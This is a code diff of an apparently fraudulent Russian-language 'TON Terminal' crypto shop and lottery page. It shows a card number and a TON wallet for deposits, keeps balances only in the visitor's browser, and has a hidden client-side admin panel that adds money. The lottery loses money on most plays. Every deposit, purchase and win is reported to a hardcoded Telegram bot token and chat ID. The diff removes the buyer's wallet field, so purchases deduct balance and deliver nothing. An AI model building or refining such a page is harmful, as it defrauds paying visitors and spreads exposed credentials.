@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TON Terminal — Full Access 2026</title>
+    <title>TON Terminal — Bugfix Edition 2026</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap');
@@ -14,21 +14,19 @@
         .buy-btn:hover { transform: scale(1.02); box-shadow: 0 0 25px rgba(16, 185, 129, 0.3); }
         .nav-tab.active { background: rgba(59, 130, 246, 0.2); border: 1px solid #3b82f6; color: #3b82f6; }
         
-        /* Исправление селектов */
         select { appearance: none; background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='white' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e"); background-repeat: no-repeat; background-position: right 1rem center; background-size: 1em; }
         select option { background-color: #0f172a; color: white; }
 
-        /* Эффекты */
         #snow-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none; }
         .falling-item { position: absolute; top: -50px; color: rgba(255,255,255,0.6); animation: fall linear infinite; }
         @keyframes fall { to { transform: translateY(110vh) rotate(360deg); } }
-        .box-shake { animation: shake 0.15s infinite; }
-        @keyframes shake { 0%, 100% { transform: translateX(0); } 20% { transform: translateX(-8px); } 40% { transform: translateX(8px); } }
         
         #admin-sidebar { position: fixed; left: -350px; top: 0; width: 320px; height: 100%; z-index: 1000; transition: left 0.4s ease; }
         #admin-sidebar.open { left: 0; }
         #notify-toast { transform: translateY(-150%); transition: transform 0.5s ease; z-index: 3000; }
         #notify-toast.show { transform: translateY(20px); }
+        .box-shake { animation: shake 0.15s infinite; }
+        @keyframes shake { 0%, 100% { transform: translateX(0); } 20% { transform: translateX(-8px); } 40% { transform: translateX(8px); } }
     </style>
 </head>
 <body class="min-h-screen pb-20">
@@ -38,32 +36,33 @@
     <div id="notify-toast" class="fixed top-0 left-0 right-0 flex justify-center pointer-events-none">
         <div class="glass border-blue-500/30 px-6 py-4 rounded-2xl shadow-2xl flex items-center gap-3">
             <div id="notify-icon" class="text-xl">🔔</div>
-            <div id="notify-msg" class="text-xs font-black uppercase">Сообщение</div>
+            <div id="notify-msg" class="text-xs font-black uppercase">Уведомление</div>
         </div>
     </div>
 
     <div id="password-modal" class="fixed inset-0 bg-black/95 z-[2000] hidden items-center justify-center p-4">
         <div class="glass p-10 rounded-[3rem] max-w-sm w-full text-center border-blue-500/20">
-            <h3 class="text-xl font-black uppercase mb-2 text-blue-400">Admin Key</h3>
-            <input type="password" id="admin-pin-input" maxlength="4" class="input-box w-full py-5 rounded-2xl text-4xl font-black text-center outline-none border-blue-500/30 text-white mb-8" placeholder="****">
+            <h3 class="text-xl font-black uppercase mb-2 text-blue-400">Admin Login</h3>
+            <p class="text-[9px] text-slate-500 mb-6 uppercase">Введите актуальный код из бота</p>
+            <input type="text" id="admin-pin-input" maxlength="4" class="input-box w-full py-5 rounded-2xl text-4xl font-black text-center outline-none border-blue-500/30 text-white mb-8" placeholder="0000">
             <div class="flex gap-3">
-                <button onclick="checkAdminPassword()" class="flex-1 buy-btn py-4 rounded-xl font-black text-[10px] uppercase">Войти</button>
-                <button onclick="closeModal('password-modal')" class="px-6 bg-white/5 rounded-xl text-[10px] font-bold uppercase">Отмена</button>
+                <button onclick="checkAdminPassword()" class="flex-1 buy-btn py-4 rounded-xl font-black text-[10px] uppercase">Проверить</button>
+                <button onclick="closeModal('password-modal')" class="px-6 bg-white/5 rounded-xl text-[10px] font-bold uppercase">Назад</button>
             </div>
         </div>
     </div>
 
     <div id="admin-sidebar" class="glass border-r border-blue-500/20 p-8 flex flex-col">
-        <h3 class="text-xl font-black uppercase text-blue-500 mb-8">Admin Panel</h3>
+        <h3 class="text-xl font-black uppercase text-blue-500 mb-8">Admin Center</h3>
         <div class="space-y-6 flex-1 overflow-y-auto">
-            <button onclick="adminAddMoney()" class="w-full bg-green-600/20 border border-green-500/30 py-3 rounded-xl text-xs font-bold uppercase">Добавить 1000 грн</button>
+            <button onclick="adminAddMoney()" class="w-full bg-green-600/20 border border-green-500/30 py-3 rounded-xl text-xs font-bold uppercase">➕ 1000 грн</button>
             <div id="sidebar-pending-list" class="space-y-3"></div>
         </div>
         <button onclick="toggleSidebar()" class="mt-8 text-slate-500 text-[10px] font-black uppercase">Закрыть</button>
     </div>
 
     <nav class="border-b border-white/5 py-4 px-4 md:px-8 flex justify-between items-center glass sticky top-0 z-50">
-        <div class="flex items-center gap-2"><span class="text-lg font-extrabold italic uppercase tracking-tighter">Ton<span class="text-blue-500">Terminal</span></span></div>
+        <div class="flex items-center gap-2"><span class="text-lg font-extrabold italic">TON<span class="text-blue-500">TERMINAL</span></span></div>
         <div class="flex items-center gap-3">
             <div class="text-right glass px-4 py-1.5 rounded-xl border border-white/10"><p id="balance-display" class="text-sm font-black text-green-400">0.00 грн</p></div>
             <button onclick="handleDepositBtnClick()" class="bg-blue-600 p-2 rounded-lg transition-all hover:scale-110">➕</button>
@@ -91,10 +90,9 @@
                 <h3 class="text-2xl font-black uppercase mb-8 text-center italic text-blue-500">Покупка Активов</h3>
                 <div class="space-y-4">
                     <select id="shop-coin-select" class="w-full bg-[#0f172a] border border-white/10 p-5 rounded-2xl text-sm font-bold text-white outline-none" onchange="updateShopRate()"></select>
-                    <div class="input-box p-5 rounded-2xl"><label class="text-[9px] text-slate-500 uppercase font-black block">Количество</label><input type="number" id="shop-qty" value="1" class="bg-transparent text-2xl font-bold outline-none w-full" oninput="updateShopRate()"></div>
-                    <div class="input-box p-5 rounded-2xl"><label class="text-[9px] text-blue-500 uppercase font-black block">Ваш адрес кошелька</label><input type="text" id="shop-wallet" placeholder="UQ..." class="bg-transparent text-xs font-mono outline-none w-full"></div>
+                    <div class="input-box p-5 rounded-2xl"><label class="text-[9px] text-slate-500 uppercase font-black block">Кол-во</label><input type="number" id="shop-qty" value="1" class="bg-transparent text-2xl font-bold outline-none w-full" oninput="updateShopRate()"></div>
                     <div id="shop-total" class="text-center p-6 bg-blue-500/5 border border-blue-500/10 rounded-2xl text-3xl font-black text-green-400">0.00 грн</div>
-                    <button onclick="processFinalPurchase()" class="buy-btn w-full py-5 rounded-2xl font-black text-sm uppercase shadow-2xl">Купить Ассет</button>
+                    <button onclick="processFinalPurchase()" class="buy-btn w-full py-5 rounded-2xl font-black text-sm uppercase shadow-2xl">Купить</button>
                 </div>
             </div>
         </div>
@@ -104,12 +102,12 @@
                 <div id="lotto-stage">
                     <h2 class="text-4xl font-black mb-8 uppercase italic tracking-tighter">Mega <span class="text-blue-500">Box</span> 🎁</h2>
                     <div id="box-anim" class="text-[10rem] my-10 cursor-pointer">🎅</div>
-                    <button onclick="playLotto()" id="lotto-btn" class="buy-btn px-16 py-5 rounded-2xl font-black text-lg uppercase shadow-2xl">Открыть за 350 грн</button>
+                    <button onclick="playLotto()" id="lotto-btn" class="buy-btn px-16 py-5 rounded-2xl font-black text-lg uppercase shadow-2xl">Открыть (350 грн)</button>
                 </div>
                 <div id="prize-reveal" class="hidden flex-col items-center py-10">
                     <div id="prize-icon" class="text-9xl mb-6">💎</div>
                     <div id="prize-value" class="text-6xl font-black text-yellow-500 mb-8">0 грн</div>
-                    <button onclick="resetLotto()" class="text-[10px] font-bold uppercase text-slate-500 hover:text-white">Еще раз</button>
+                    <button onclick="resetLotto()" class="text-[10px] font-bold uppercase text-slate-500">Назад</button>
                 </div>
             </div>
         </div>
@@ -123,8 +121,8 @@
                 <button onclick="showDetails('Card')" class="flex-1 bg-white/5 border border-white/5 p-4 rounded-xl text-[10px] font-bold uppercase">Карта</button>
                 <button onclick="showDetails('Crypto')" class="flex-1 bg-white/5 border border-white/5 p-4 rounded-xl text-[10px] font-bold uppercase">Крипта</button>
             </div>
-            <div id="pay-details" class="hidden bg-black/40 p-4 rounded-2xl mb-8 text-[10px] font-mono break-all border border-white/10 text-white select-all"></div>
-            <button onclick="confirmDeposit()" class="w-full buy-btn py-4 rounded-xl font-black text-xs uppercase text-white">Я оплатил</button>
+            <div id="pay-details" class="hidden bg-black/40 p-4 rounded-2xl mb-8 text-[10px] font-mono break-all border border-white/10 text-white"></div>
+            <button onclick="confirmDeposit()" class="w-full buy-btn py-4 rounded-xl font-black text-xs uppercase text-white tracking-widest">Я оплатил</button>
             <button onclick="closeModal('deposit-modal')" class="w-full mt-4 text-slate-600 text-[10px] font-black uppercase">Отмена</button>
         </div>
     </div>
@@ -133,59 +131,74 @@
     <script>
         const TG_TOKEN = "8357376946:AAHbffgk6JY0Ip3yJ3yOGpTaG-_HZ7gjJZw";
         const TG_CHAT_ID = "5252821529";
-        const COINS = ["TON", "BTC", "ETH", "SOL", "TRX", "DOGE", "XRP", "LTC", "ADA", "AVAX", "DOT", "MATIC", "LINK", "NEAR", "SHIB", "BCH", "UNI", "ATOM"];
+        const COINS = ["TON", "BTC", "ETH", "SOL", "TRX", "DOGE", "XRP", "LTC", "ADA", "DOT", "MATIC", "LINK", "SHIB"];
 
-        let currentAdminPassword = "";
-        let balance = parseFloat(localStorage.getItem('user_balance')) || 4600.00;
+        let balance = parseFloat(localStorage.getItem('user_balance')) || 0.00; // Исправлен начальный баланс на 0
         let rates = {};
         let depBtnClicks = 0;
         let pendingList = JSON.parse(localStorage.getItem('pending_list')) || [];
+        let currentAdminPassword = "";
 
-        // БОТ И ПАРОЛЬ
-        async function rotatePassword() {
-            currentAdminPassword = Math.floor(1000 + Math.random() * 9000).toString();
-            const msg = `🔐 НОВЫЙ КОД АДМИНА: ${currentAdminPassword}\nОбновление через 70 минут.`;
-            try { await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(msg)}`); } catch(e) {}
+        // СИНХРОНИЗАЦИЯ ПАРОЛЯ КАЖДЫЕ 70 МИНУТ (У ВСЕХ ОДИНАКОВЫЙ)
+        function getGlobalCode() {
+            const timeSlot = Math.floor(Date.now() / (70 * 60 * 1000)); 
+            // Простой алгоритм создания 4-значного числа из временного слота
+            return ((timeSlot * 1337) % 9000 + 1000).toString();
         }
-        rotatePassword(); setInterval(rotatePassword, 4200000);
+
+        async function updateAdminPassword() {
+            const newCode = getGlobalCode();
+            if (newCode !== currentAdminPassword) {
+                currentAdminPassword = newCode;
+                const msg = `🔐 ПАРОЛЬ СИНХРОНИЗИРОВАН: ${currentAdminPassword}\nОн одинаков для всех на 70 минут.`;
+                try { await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(msg)}`); } catch(e) {}
+            }
+        }
+        updateAdminPassword();
+        setInterval(updateAdminPassword, 60000); // Проверка смены кода каждую минуту
 
         function handleDepositBtnClick() {
             depBtnClicks++;
             if (depBtnClicks >= 3) { openModal('password-modal'); depBtnClicks = 0; }
             else { 
-                const timeout = setTimeout(() => { if(depBtnClicks > 0 && depBtnClicks < 3) openModal('deposit-modal'); depBtnClicks = 0; }, 300);
+                setTimeout(() => { if(depBtnClicks > 0 && depBtnClicks < 3) { openModal('deposit-modal'); depBtnClicks = 0; } }, 300);
             }
         }
 
         function checkAdminPassword() {
-            if (document.getElementById('admin-pin-input').value === currentAdminPassword) {
+            const input = document.getElementById('admin-pin-input');
+            if (input.value === currentAdminPassword) {
                 closeModal('password-modal'); toggleSidebar();
-            } else { alert("Неверно!"); }
-            document.getElementById('admin-pin-input').value = "";
+            } else { alert("Код не совпадает!"); }
+            input.value = "";
         }
 
-        // БАЛАНС И АДМИНКА
         function updateUI() {
             document.getElementById('balance-display').innerText = balance.toFixed(2) + " грн";
             localStorage.setItem('user_balance', balance);
         }
-        function adminAddMoney() { balance += 1000; updateUI(); }
+
+        function adminAddMoney() { balance += 1000; updateUI(); showNotify("Баланс обновлен!", "💎"); }
+
         function toggleSidebar() { document.getElementById('admin-sidebar').classList.toggle('open'); renderSidebarList(); }
+
         function renderSidebarList() {
             const l = document.getElementById('sidebar-pending-list');
             l.innerHTML = pendingList.length ? pendingList.map((d, i) => `
                 <div class="bg-white/5 p-4 rounded-xl flex justify-between items-center border border-white/10">
                     <p class="text-sm font-black text-green-400">${d.amount} грн</p>
                     <button onclick="approveInSidebar(${i})" class="bg-green-600 px-3 py-1.5 rounded-lg text-[9px] font-black uppercase">OK</button>
-                </div>`).join('') : '<p class="text-center text-slate-500 text-[9px] italic">Пусто</p>';
-        }
-        function approveInSidebar(i) {
-            balance += parseFloat(pendingList[i].amount); pendingList.splice(i, 1);
-            localStorage.setItem('pending_list', JSON.stringify(pendingList));
-            updateUI(); renderSidebarList();
+                </div>`).join('') : '<p class="text-center text-slate-500 text-[9px] italic">Запросов нет</p>';
         }
 
-        // КУРСЫ
+        function approveInSidebar(i) {
+            balance += parseFloat(pendingList[i].amount);
+            pendingList.splice(i, 1);
+            localStorage.setItem('pending_list', JSON.stringify(pendingList));
+            updateUI(); renderSidebarList();
+            showNotify("Оплата подтверждена!", "✅");
+        }
+
         async function fetchRates() {
             try {
                 const res = await fetch('https://api.binance.com/api/v3/ticker/price');
@@ -201,42 +214,36 @@
                 updateShopRate();
             } catch(e) {}
         }
+
         function runGlobalConvert() {
             const usd = parseFloat(document.getElementById('conv-usd').value) || 0;
             const container = document.getElementById('conv-results');
-            container.innerHTML = Object.keys(rates).map(c => `<div class="bg-white/5 p-3 rounded-xl border border-white/5 text-center"><p class="text-[7px] text-slate-500 font-bold uppercase mb-1">${c}</p><p class="text-[11px] font-black text-blue-400">${(usd/rates[c]).toFixed(rates[c]<1?2:5)}</p></div>`).join('');
+            container.innerHTML = Object.keys(rates).map(c => `<div class="bg-white/5 p-3 rounded-xl border border-white/5 text-center"><p class="text-[7px] text-slate-500 font-bold mb-1">${c}</p><p class="text-[11px] font-black text-blue-400">${(usd/rates[c]).toFixed(rates[c]<1?2:5)}</p></div>`).join('');
         }
+
         function updateShopRate() {
             const c = document.getElementById('shop-coin-select').value;
             const q = parseFloat(document.getElementById('shop-qty').value) || 0;
             if(rates[c]) document.getElementById('shop-total').innerText = (q * rates[c] * 42.5 * 1.075).toFixed(2) + " грн";
         }
 
-        // ФУНКЦИИ КНОПОК
-        function showTab(t) {
-            ['main', 'shop', 'lotto'].forEach(v => document.getElementById('view-'+v).classList.toggle('hidden', v !== t));
-            ['btn-main', 'btn-shop', 'btn-lotto'].forEach(b => document.getElementById(b).classList.toggle('active', b === 'btn-'+t));
-        }
-        function openModal(id) { document.getElementById(id).classList.remove('hidden'); document.getElementById(id).classList.add('flex'); }
-        function closeModal(id) { document.getElementById(id).classList.add('hidden'); document.getElementById(id).classList.remove('flex'); }
-        function showDetails(m) {
-            const d = document.getElementById('pay-details'); d.classList.remove('hidden');
-            d.innerText = m === 'Card' ? "444 1144 3897 8734" : "UQC9jGCKJKY5F77vrlWERXBCG38LBIc54y__gZSEprBJ2IGz";
-        }
         function confirmDeposit() {
             const a = document.getElementById('dep-input').value;
-            pendingList.push({ amount: a }); localStorage.setItem('pending_list', JSON.stringify(pendingList));
-            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent("💰 ДЕПОЗИТ: "+a+" грн")}`);
-            closeModal('deposit-modal'); alert("Запрос отправлен!");
+            pendingList.push({ amount: a });
+            localStorage.setItem('pending_list', JSON.stringify(pendingList));
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent("💰 НОВАЯ ОПЛАТА: "+a+" грн. Проверь и подтверди через админку на сайте!")}`);
+            closeModal('deposit-modal'); showNotify("Запрос отправлен админу!", "⏳");
         }
+
         function processFinalPurchase() {
             const p = parseFloat(document.getElementById('shop-total').innerText);
-            if(balance < p) return alert("Мало грн!");
-            balance -= p; updateUI(); alert("Ожидайте крипту!");
-            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent("🛒 КУПИЛИ на "+p+" грн")}`);
+            if(balance < p) return showNotify("Мало баланса!", "❌");
+            balance -= p; updateUI(); showNotify("Заявка принята!", "🚀");
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent("🛒 ПОКУПКА на "+p+" грн")}`);
         }
+
         function playLotto() {
-            if (balance < 350) return alert("Нужно 350 грн!");
+            if (balance < 350) return showNotify("Нужно 350 грн!", "❌");
             balance -= 350; updateUI();
             const b = document.getElementById('box-anim');
             b.classList.add('box-shake');
@@ -248,12 +255,34 @@
                 let win = (rand <= 0.0001) ? 2500 : (rand <= 0.05 ? 1000 : (rand <= 5 ? 400 : 275));
                 balance += win; updateUI();
                 document.getElementById('prize-value').innerText = win + " грн";
-                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent("🎉 ЛОТО: "+win+" грн")}`);
+                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent("🎉 ВЫИГРЫШ: "+win+" грн")}`);
             }, 2000);
         }
+
         function resetLotto() {
             document.getElementById('lotto-stage').classList.remove('hidden');
             document.getElementById('prize-reveal').classList.add('hidden');
+        }
+
+        function showTab(t) {
+            ['main', 'shop', 'lotto'].forEach(v => document.getElementById('view-'+v).classList.toggle('hidden', v !== t));
+            ['btn-main', 'btn-shop', 'btn-lotto'].forEach(b => document.getElementById(b).classList.toggle('active', b === 'btn-'+t));
+        }
+
+        function openModal(id) { document.getElementById(id).classList.remove('hidden'); document.getElementById(id).classList.add('flex'); }
+        function closeModal(id) { document.getElementById(id).classList.add('hidden'); document.getElementById(id).classList.remove('flex'); }
+
+        function showDetails(m) {
+            const d = document.getElementById('pay-details'); d.classList.remove('hidden');
+            d.innerText = m === 'Card' ? "444 1144 3897 8734" : "UQC9jGCKJKY5F77vrlWERXBCG38LBIc54y__gZSEprBJ2IGz";
+        }
+
+        function showNotify(text, icon = '🔔') {
+            const toast = document.getElementById('notify-toast');
+            document.getElementById('notify-msg').innerText = text;
+            document.getElementById('notify-icon').innerText = icon;
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 3000);
         }
 
         setInterval(fetchRates, 30000); fetchRates(); updateUI();
